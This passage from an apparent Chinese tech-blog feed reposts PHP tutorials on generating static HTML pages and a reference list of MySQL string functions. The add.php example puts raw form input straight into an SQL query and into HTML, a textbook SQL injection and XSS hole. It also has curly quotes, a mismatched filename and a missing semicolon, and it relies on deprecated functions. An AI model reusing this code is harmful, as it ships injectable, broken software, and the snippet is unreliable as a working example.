class="keyword">buffer </span>= eregi_replace(<span class="string">"r"</span>,<span class="string">""</span>,$<span class="keyword">buffer); </span></span><br><span class="line">ob_end_clean()<span class="comment">; </span></span><br><span class="line"></span><br><span class="line">$<span class="built_in">fp</span> = fopen($o_fname,<span class="string">"w+"</span>)<span class="comment">; </span></span><br><span class="line">fwrite($<span class="built_in">fp</span>,$<span class="keyword">buffer); </span></span><br><span class="line">fclose($<span class="built_in">fp</span>)<span class="comment">; </span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这样就可以把 93e.php转化为静态的HTML文件了 。要注意的是待转换的文件里不能有 ob_end_clean();和 ob_start();语句，且目录要有写权限。</p><p>来自：<a href="http://www.phpchina.com/archives/view-36910-1.html" target="_blank" rel="noopener">http://www.phpchina.com/archives/view-36910-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP生成静态html网页的三种方法</title>
      <link href="/2013/07/18/php/PHP%E7%94%9F%E6%88%90%E9%9D%99%E6%80%81html%E7%BD%91%E9%A1%B5%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
      <url>/2013/07/18/php/PHP%E7%94%9F%E6%88%90%E9%9D%99%E6%80%81html%E7%BD%91%E9%A1%B5%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>第一种：利用模板。目前PHP的模板可以说是很多了，有功能强大的smarty，还有简单易用的smarttemplate等。它们每一种模板，都有一个获取输出内容的函数。我们生成静态页面的方法，就是利用了这个函数。用这个方法的优点是，代码比较清晰，可读性好。</p><p>PHP代码举例：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">'smarty/Smarty.class.php'</span>);</span></span><br><span class="line"><span class="php">$t = <span class="keyword">new</span> Smarty;</span></span><br><span class="line"><span class="php">$t-&gt;assign(<span class="string">"title"</span>,<span class="string">"Hello World!"</span>);</span></span><br><span class="line"><span class="php">$content = $t-&gt;fetch(<span class="string">"templates/index.htm"</span>);</span></span><br><span class="line"><span class="php"><span class="comment">//这里的 fetch() 就是获取输出内容的函数,现在$content变量里面,就是要显示的内容了</span></span></span><br><span class="line"><span class="php">$fp = fopen(<span class="string">"archives/2005/05/19/0001.html"</span>, <span class="string">"w"</span>);</span></span><br><span class="line"><span class="php">fwrite($fp, $content);</span></span><br><span class="line"><span class="php">fclose($fp);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>第二种方法：利用ob系列的函数。这里用到的函数主要是 ob_start(), ob_end_flush(), ob_get_content(),其中ob_start()是打开浏览器缓冲区的意思，打开缓冲后，所有来自PHP程序的非文件头信息均不会发送，而是保存在内部缓冲区，直到你使用了ob_end_flush().而这里最重要的一个函数，就是ob_get_contents(),这个函数的作用是获取缓冲区的内容，相当于上面的那个fetch(),道理一样的。</p><p>PHP代码举例：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">ob_start();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Hello World!"</span>;</span></span><br><span class="line"><span class="php">$content = ob_get_contents();<span class="comment">//取得php页面输出的全部内容</span></span></span><br><span class="line"><span class="php">$fp = fopen(<span class="string">"archives/2005/05/19/0001.html"</span>, <span class="string">"w"</span>);</span></span><br><span class="line"><span class="php">fwrite($fp, $content);</span></span><br><span class="line"><span class="php">fclose($fp);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>方法三：下面转贴一个比较通用且好懂的</p><p>前言：</p><p>目前网络上好多网站的新闻发布系统都采用了动态服务器技术生成静态HTML的做法，这样做的好处是：一是能减轻其服务器的负担，二是因为生成了HTML静态页面，所以其网站被搜索引擎搜索到的机率更大一些。笔者的网站曾经使用PHP这一动态技术来构建新闻发布系统，其原理也就是应用了PHP生成HTML静态页面的技术，相关平台是 Windows XP Sp2+php4.32+mysql，因此，在这里，想简单地谈一下这种做法的思路。这篇文章适合于对PHP+MYSQL数据库操作，SQL语句以及网页设计有点基础的朋友，如果您是一个从头开始学的朋友，那么请先打好基础吧！到这里就不用往下看了。如果您都符合上述条件的话，那么恭喜您，请接着往下看。但是，在具体动手构建之前，您还要做好以下几点准备工作。</p><p>一、 具备本地调试PHP的功能</p><p>在WINDOWS XP操作系统下，笔者建议你可以到网上下载一个PHP+MYSQL+APHCHE的服务器套装，如华军软件园，去那里搜索一下就可以下载到。下载完后默认安装即可，这样您就具备了在本地测试PHP的功能了，省去了很多手动配置的麻烦，怎么样，简单吧，OK，这仅仅只是第一步。</p><p>二、 构思新闻发布系统所具备的功能</p><p>首页的新闻发布往往是通过后台更新的，后台的更新无非是由添加、编辑、删除数据等基本的功能所实现的。在这里，你可以使用网页设计软件来构建你的想要的后台界面，其功能的实现当然是要用到PHP喽。这一步建议您先想好新闻发布系统要有的功能。在这里，如何用PHP添加、编辑、删除数据就不再重复，因为重点是如何在这基础上生成静态技术。</p><p>三、 PHP生成HTML的技术原理。</p><p>哈哈。费话说了那么多，终于到了该讲的地方了。其实，这一原理并不复杂，综合地来讲的话，应该是PHP中一个替换数据语法的应用。OK，讲一个简单范例吧，一步一步地分析！相信聪明的你能看得明白的咯，仔细看好每一步即可，在这里，只是引导大家如何做而已，具体的可以实践一下！</p><p>（1）在MYSQL里新建一数据库，命名为 database （可自定义），新建一表，命名为 news（因为是新闻发布嘛，取个好记的名字即可，可自定义），然后建立这几个字段名：<br>id (自动递增，这是关键，类型：INT)<br>title (顾名思义，新闻标题，类型可取 TEXT)<br>content (新闻内容，类型可取 TEXT)<br>path (HTML文件路径，类型可取 TEXT)</p><p>（2）建立 conn.php<br>这是连接数据库的PHP文件，你可以把连接数据的语句单独放在这一文件里，以后多个需要连接数据库的文件直接引用这个文件即可。</p><p>（3）设计添加新闻的表格 add.form 简单的源代码如下:</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">”post”</span> <span class="attr">action</span>=<span class="string">”add.php”</span>&gt;</span> //提交至 add.php</span><br><span class="line">新闻标题:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”text”</span> <span class="attr">name</span>=<span class="string">”title”</span> <span class="attr">size</span>=<span class="string">”20”</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">新闻内容:<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">”content”</span> <span class="attr">cols</span>=<span class="string">”10”</span> <span class="attr">rows</span>=<span class="string">”25”</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”submit”</span> <span class="attr">name</span>=<span class="string">”提交”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">”post”</span> <span class="attr">action</span>=<span class="string">”add.php”</span>&gt;</span> //提交至 add.php</span><br><span class="line">新闻标题:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”text”</span> <span class="attr">name</span>=<span class="string">”title”</span> <span class="attr">size</span>=<span class="string">”20”</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">新闻内容:<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">”content”</span> <span class="attr">cols</span>=<span class="string">”10”</span> <span class="attr">rows</span>=<span class="string">”25”</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”submit”</span> <span class="attr">name</span>=<span class="string">”提交”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>（4）建立一个 HTML 的模板,另存为model.htm,和 add.php可以在同一目录下。<br>示例源代码:</p><html><body>此新闻的标题:{title}此新闻的内容:{content}</body></html>{ }大括号内的内容即是要被替换的内容，整个静态模板的设计可以根据自己的思路，但{ }内被替换的内容必须包含在内，如上面的{title}，{content}；咔咔~简单地说，设计好一个很好看的新闻模板后，把要被替换的如{title},{content}等标记放到需要的地方就可以了撒。<p>（5）详解 add.php 源码</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span>(“conn.php”)； <span class="comment">//引用conn.php，连接数据库</span></span></span><br><span class="line"><span class="php">$title=$_POST[“title”];</span></span><br><span class="line"><span class="php">$content=$_POST[“content”]; <span class="comment">//获得表单变量</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">//以下建立一文本文档，其值自动计数</span></span></span><br><span class="line"><span class="php">$countfile=<span class="string">"count.txt"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!file_exists($countfile))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">fopen($countfile,<span class="string">"w"</span>); <span class="comment">//如果此文件不存在，则自动建立一个</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$fp=fopen($countfile,<span class="string">"r"</span>);</span></span><br><span class="line"><span class="php">$num=fgets($fp,<span class="number">20</span>);</span></span><br><span class="line"><span class="php">$num=$num+<span class="number">1</span>; <span class="comment">//每次其值自动加一</span></span></span><br><span class="line"><span class="php">fclose($fp);</span></span><br><span class="line"><span class="php">$fp=fopen($countfile,<span class="string">"w"</span>);</span></span><br><span class="line"><span class="php">fwrite($fp,$num); <span class="comment">//更新其值</span></span></span><br><span class="line"><span class="php">fclose($fp);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">//利用上面自动计数的值获得HTML的路径$path</span></span></span><br><span class="line"><span class="php">$houzui=”.html”;</span></span><br><span class="line"><span class="php">$path=$num.$houzui;</span></span><br><span class="line"><span class="php"><span class="comment">//这样形成的路径是自动增长的，如1.html,2.html,3.html……….添加一条新闻便自动加上1</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">//以下用SQL语句添加数据至表 news</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$sql=”insert into news (title,content,path) values (‘”.$title.”’,’”.$content.”’,’”.$path.”’)”;</span></span><br><span class="line"><span class="php">$query=mysql_query($sql);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">//以下为关键之处，把从表单获得的数据替换模板中的&#123;title&#125;,&#123;content&#125;标记</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$fp=fopen(“model.htm”,”r”) <span class="comment">//只读打开模板</span></span></span><br><span class="line"><span class="php">$str=fread($fp,filesize(“mode.htm”));<span class="comment">//读取模板中内容</span></span></span><br><span class="line"><span class="php">$str=str_replace(“&#123;title&#125;”,$title,$str);</span></span><br><span class="line"><span class="php">$str=str_replace(“&#123;content&#125;”,$content,$str);<span class="comment">//替换内容</span></span></span><br><span class="line"><span class="php">fclose($fp);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$handle=fopen($path,”w”); <span class="comment">//写入方式打开新闻路径</span></span></span><br><span class="line"><span class="php">fwrite($handle,$str); <span class="comment">//把刚才替换的内容写进生成的HTML文件</span></span></span><br><span class="line"><span class="php">fclose($handle);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">//收尾工作:</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> “&lt;a href=$path target=_blank&gt;查看刚才添加的新闻&lt;/a&gt;”;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">OK,整个生成HTML的示例源码就到这里，其关键是用了替换的方法。</span></span><br><span class="line"><span class="php">$str=str_replace(“&#123;被替换的内容&#125;”,$替换的内容,$str);</span></span><br></pre></td></tr></table></figure><p>因此，总结一下以上的做法：先设计好新闻模板，把需要被替换的内容用{ }放到模板中相应的位置，然后设计表单，再是最后的表单处理程序，把从表单中获取的变量替换模板中相应的内容即可，这样每次都会生成不同的HTML；如果需要修改HTML的内容也是一样的，获得修改后的表单内容后，先用 update 语句更新数据库，再重新替换一下模板中的内容即可；删除的话，先delete表中要删除的内容，再用unlink($path) 来删除HTML的物理文件即可。</p><p>来自：<a href="http://blog.csdn.net/yeqihong/article/details/2122464" target="_blank" rel="noopener">http://blog.csdn.net/yeqihong/article/details/2122464</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql字符串操作</title>
      <link href="/2013/07/05/mysql/mysql%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/"/>
      <url>/2013/07/05/mysql/mysql%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ASCII(str)</span><br><span class="line">返回字符串str的第一个字符的ASCII值(str是空串时返回0)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ASCII(’2′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 50</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ASCII(2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 50</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ASCII(’dete’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 100</span></span><br><span class="line"></span><br><span class="line">ORD(str)</span><br><span class="line">如果字符串str句首是单字节返回与ASCII()函数返回的相同值。</span><br><span class="line">如果是一个多字节字符,以格式返回((first byte ASCII code)*256+(second byte ASCII code))[*256+third byte ASCII code...]</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ORD(’2′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 50</span></span><br><span class="line"></span><br><span class="line">CONV(N,from_base,to_base)</span><br><span class="line">对数字N进制转换,并转换为字串返回(任何参数为NULL时返回NULL,进制范围为2-36进制,当to_base是负数时N作为有符号数否则作无符号数,CONV以64位点精度工作)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CONV(”a”,16,2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘1010′</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CONV(”6E”,18,8);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘172′</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CONV(-17,10,-18);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘-H’</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CONV(10+”10″+’10′+0xa,10,10);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘40′</span></span><br><span class="line"></span><br><span class="line">BIN(N)</span><br><span class="line">把N转为二进制值并以字串返回(N是BIGINT数字,等价于CONV(N,10,2))</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select BIN(12);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘1100′</span></span><br><span class="line"></span><br><span class="line">OCT(N)</span><br><span class="line">把N转为八进制值并以字串返回(N是BIGINT数字,等价于CONV(N,10,8))</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select OCT(12);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘14′</span></span><br><span class="line"></span><br><span class="line">HEX(N)</span><br><span class="line">把N转为十六进制并以字串返回(N是BIGINT数字,等价于CONV(N,10,16))</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select HEX(255);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘FF’</span></span><br><span class="line"></span><br><span class="line">CHAR(N,…)</span><br><span class="line">返回由参数N,…对应的ASCII代码字符组成的一个字串(参数是N,…是数字序列,NULL值被跳过) </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CHAR(77,121,83,81,’76′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘MySQL’</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CHAR(77,77.3,’77.3′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘MMM’</span></span><br><span class="line"></span><br><span class="line">CONCAT(str1,str2,…)</span><br><span class="line">把参数连成一个长字符串并返回(任何参数是NULL时返回NULL)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CONCAT(’My’, ‘S’, ‘QL’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘MySQL’</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CONCAT(’My’, NULL, ‘QL’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> NULL</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CONCAT(14.3);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘14.3′</span></span><br><span class="line"></span><br><span class="line">LENGTH(str)</span><br><span class="line">OCTET_LENGTH(str)</span><br><span class="line">CHAR_LENGTH(str)</span><br><span class="line">CHARACTER_LENGTH(str)</span><br><span class="line">返回字符串str的长度(对于多字节字符CHAR_LENGTH仅计算一次)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LENGTH(’text’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 4</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select OCTET_LENGTH(’text’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 4</span></span><br><span class="line"></span><br><span class="line">LOCATE(substr,str)</span><br><span class="line">POSITION(substr IN str)</span><br><span class="line">返回字符串substr在字符串str第一次出现的位置(str不包含substr时返回0)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LOCATE(’bar’, ‘foobarbar’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 4</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LOCATE(’xbar’, ‘foobar’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0</span></span><br><span class="line"></span><br><span class="line">LOCATE(substr,str,pos)</span><br><span class="line">返回字符串substr在字符串str的第pos个位置起第一次出现的位置(str不包含substr时返回0)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LOCATE(’bar’, ‘foobarbar’,5);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 7</span></span><br><span class="line"></span><br><span class="line">INSTR(str,substr)</span><br><span class="line">返回字符串substr在字符串str第一次出现的位置(str不包含substr时返回0)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select INSTR(’foobarbar’, ‘bar’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 4</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select INSTR(’xbar’, ‘foobar’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0</span></span><br><span class="line"></span><br><span class="line">LPAD(str,len,padstr)</span><br><span class="line">用字符串padstr填补str左端直到字串长度为len并返回</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LPAD(’hi’,4,’??’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘??hi’</span></span><br><span class="line"></span><br><span class="line">RPAD(str,len,padstr)</span><br><span class="line">用字符串padstr填补str右端直到字串长度为len并返回</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select RPAD(’hi’,5,’?<span class="string">');</span></span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘hi???’</span></span><br><span class="line"></span><br><span class="line">LEFT(str,len)</span><br><span class="line">返回字符串str的左端len个字符</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LEFT(’foobarbar’, 5);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘fooba’</span></span><br><span class="line"></span><br><span class="line">RIGHT(str,len)</span><br><span class="line">返回字符串str的右端len个字符</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select RIGHT(’foobarbar’, 4);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘rbar’</span></span><br><span class="line"></span><br><span class="line">SUBSTRING(str,pos,len)</span><br><span class="line">SUBSTRING(str FROM pos FOR len)</span><br><span class="line">MID(str,pos,len)</span><br><span class="line">返回字符串str的位置pos起len个字符(使用FROM的丑陋语法是ANSI SQL92标准)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SUBSTRING(’Quadratically’,5,6);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘ratica’</span></span><br><span class="line"></span><br><span class="line">SUBSTRING(str,pos)</span><br><span class="line">SUBSTRING(str FROM pos)</span><br><span class="line">返回字符串str的位置pos起的一个子串</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SUBSTRING(’Quadratically’,5);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘ratically’</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SUBSTRING(’foobarbar’ FROM 4);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘barbar’</span></span><br><span class="line"></span><br><span class="line">SUBSTRING_INDEX(str,delim,count)</span><br><span class="line">返回从字符串str的第count个出现的分隔符delim之后的子串(count为正数时返回左端,否则返回右端子串)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SUBSTRING_INDEX(’www.mysql.com’, ‘.’, 2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘www.mysql’</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SUBSTRING_INDEX(’www.mysql.com’, ‘.’, -2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘mysql.com’</span></span><br><span class="line"></span><br><span class="line">LTRIM(str)</span><br><span class="line">返回删除了左空格的字符串str</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LTRIM(’  barbar’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘barbar’</span></span><br><span class="line"></span><br><span class="line">RTRIM(str)</span><br><span class="line">返回删除了右空格的字符串str</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select RTRIM(’barbar   ‘);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘barbar’</span></span><br><span class="line"></span><br><span class="line">TRIM([[BOTH | LEADING | TRAILING] [remstr] FROM] str)</span><br><span class="line">返回前缀或后缀remstr被删除了的字符串str(位置参数默认BOTH,remstr默认值为空格)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select TRIM(’  bar   ‘);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘bar’</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select TRIM(LEADING ‘x’ FROM ‘xxxbarxxx’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘barxxx’</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select TRIM(BOTH ‘x’ FROM ‘xxxbarxxx’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘bar’</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select TRIM(TRAILING ‘xyz’ FROM ‘barxxyz’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘barx’</span></span><br><span class="line"></span><br><span class="line">SOUNDEX(str)</span><br><span class="line">返回str的一个同音字符串(听起来“大致相同”字符串有相同的同音字符串,非数字字母字符被忽略,在A-Z外的字母被当作元音)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SOUNDEX(’Hello’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘H400′</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SOUNDEX(’Quadratically’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘Q36324′</span></span><br><span class="line"></span><br><span class="line">SPACE(N)</span><br><span class="line">返回由N个空格字符组成的一个字符串</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SPACE(6);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘      ‘</span></span><br><span class="line"></span><br><span class="line">REPLACE(str,from_str,to_str)</span><br><span class="line">用字符串to_str替换字符串str中的子串from_str并返回</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select REPLACE(’www.mysql.com’, ‘w’, ‘Ww’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘WwWwWw.mysql.com’</span></span><br><span class="line"></span><br><span class="line">REPEAT(str,count)</span><br><span class="line">返回由count个字符串str连成的一个字符串(任何参数为NULL时返回NULL,count&lt;=0时返回一个空字符串)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select REPEAT(’MySQL’, 3);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘MySQLMySQLMySQL’</span></span><br><span class="line"></span><br><span class="line">REVERSE(str)</span><br><span class="line">颠倒字符串str的字符顺序并返回</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select REVERSE(’abc’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘cba’</span></span><br><span class="line"></span><br><span class="line">INSERT(str,pos,len,newstr)</span><br><span class="line">把字符串str由位置pos起len个字符长的子串替换为字符串newstr并返回</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select INSERT(’Quadratic’, 3, 4, ‘What’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘QuWhattic’</span></span><br><span class="line"></span><br><span class="line">ELT(N,str1,str2,str3,…)</span><br><span class="line">返回第N个字符串(N小于1或大于参数个数返回NULL)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ELT(1, ‘ej’, ‘Heja’, ‘hej’, ‘foo’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘ej’</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ELT(4, ‘ej’, ‘Heja’, ‘hej’, ‘foo’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘foo’</span></span><br><span class="line"></span><br><span class="line">FIELD(str,str1,str2,str3,…)</span><br><span class="line">返回str等于其后的第N个字符串的序号(如果str没找到返回0)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select FIELD(’ej’, ‘Hej’, ‘ej’, ‘Heja’, ‘hej’, ‘foo’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 2</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select FIELD(’fo’, ‘Hej’, ‘ej’, ‘Heja’, ‘hej’, ‘foo’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0</span></span><br><span class="line"></span><br><span class="line">FIND_IN_SET(str,strlist)</span><br><span class="line">返回str在字符串集strlist中的序号(任何参数是NULL则返回NULL,如果str没找到返回0,参数1包含”,”时工作异常)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT FIND_IN_SET(’b<span class="string">',’a,b,c,d’);</span></span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 2</span></span><br><span class="line"></span><br><span class="line">MAKE_SET(bits,str1,str2,…)</span><br><span class="line">把参数1的数字转为二进制,假如某个位置的二进制位等于1,对应位置的字串选入字串集并返回(NULL串不添加到结果中)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT MAKE_SET(1,’a<span class="string">',’b'</span>,’c<span class="string">');</span></span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘a’</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT MAKE_SET(1 | 4,’hello’,<span class="string">'nice’,'</span>world’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘hello,world’</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT MAKE_SET(0,’a<span class="string">',’b'</span>,’c<span class="string">');</span></span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ”</span></span><br><span class="line"></span><br><span class="line">EXPORT_SET(bits,on,off,[separator,[number_of_bits]])</span><br><span class="line">按bits排列字符串集,只有当位等于1时插入字串on,否则插入off(separator默认值”,”,number_of_bits参数使用时长度不足补0而过长截断)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select EXPORT_SET(5,’Y<span class="string">',’N'</span>,’,<span class="string">',4)</span></span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> Y,N,Y,N</span></span><br><span class="line"></span><br><span class="line">LCASE(str)</span><br><span class="line">LOWER(str)</span><br><span class="line">返回小写的字符串str</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select 